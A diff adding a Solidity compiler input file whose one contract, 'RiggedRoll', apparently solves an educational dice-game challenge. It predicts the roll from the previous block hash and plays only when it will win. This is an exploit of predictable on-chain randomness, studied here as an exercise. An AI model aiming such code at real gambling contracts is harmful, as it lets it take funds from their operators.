@@ -1,0 +1,36 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/RiggedRoll.sol": {
+      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\ninterface IDiceGame {\n    function rollTheDice() external payable;\n}\n\ncontract RiggedRoll {\n    address public owner;\n    IDiceGame public diceGame; // ✅ rename agar getter sesuai test\n    uint256 public constant rollPrice = 0.002 ether;\n\n    constructor(address diceAddress) {\n        owner = msg.sender;\n        diceGame = IDiceGame(diceAddress);\n    }\n\n    receive() external payable {}\n\n    function riggedRoll() external {\n        uint256 predicted = uint256(blockhash(block.number - 1)) % 16;\n\n        // ✅ sesuai challenge: menang jika <= 5\n        if (predicted <= 5) {\n            diceGame.rollTheDice{value: rollPrice}();\n        } else {\n            revert(\"Not a winning roll\");\n        }\n    }\n\n    // ✅ signature sesuai test\n    function withdraw(address to, uint256 amount) external {\n        require(msg.sender == owner, \"only owner\");\n        payable(to).transfer(amount);\n    }\n}\n"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": true,
+      "runs": 200
+    },
+    "evmVersion": "paris",
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
